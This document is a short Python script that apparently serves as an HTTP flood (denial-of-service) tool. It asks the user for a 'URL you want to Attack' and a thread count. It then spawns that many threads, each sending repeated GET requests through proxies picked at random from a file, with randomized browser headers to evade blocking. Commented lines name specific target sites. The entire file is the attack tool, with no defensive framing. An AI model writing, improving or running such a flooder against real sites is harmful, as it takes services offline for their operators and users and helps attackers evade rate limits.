import requests
from fake_useragent import UserAgent
import random
import threading


def random_user_agent():
    user_agent = UserAgent()
    headers ={
        'User-Agent': user_agent.random,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    }
    return headers

url=input("Enter the URL you want to Attack:")
Thread =int(input("Enter the No: of Threads:"))
# url = "http://ipinfo.io/json"
# url = "https://centinels.zeal.ninja/"
# Thread = 1024
valied_proxy=[]

with open("ValidProxy.txt","r") as f:
    valied_proxy = f.read().split("\n")

def send_req(url):

  for _ in range(10):
        int = random.randint(0,len(valied_proxy) -1)
        proxy = {
        'http': valied_proxy[int],
        'https': valied_proxy[int]
        }
     
        try:
            # print(proxy)
            res = requests.get(url, headers=random_user_agent(),proxies=proxy)
            print(res.json())
        except Exception as e:
            print(f"Error making request to {url}: {e}")  


threads =[]

i=0
while i <= Thread:
    thread = threading.Thread(target=send_req, args=(url,))
    thread.start()
    threads.append(thread)
    i += 1

for thread in threads:
    thread.join()    








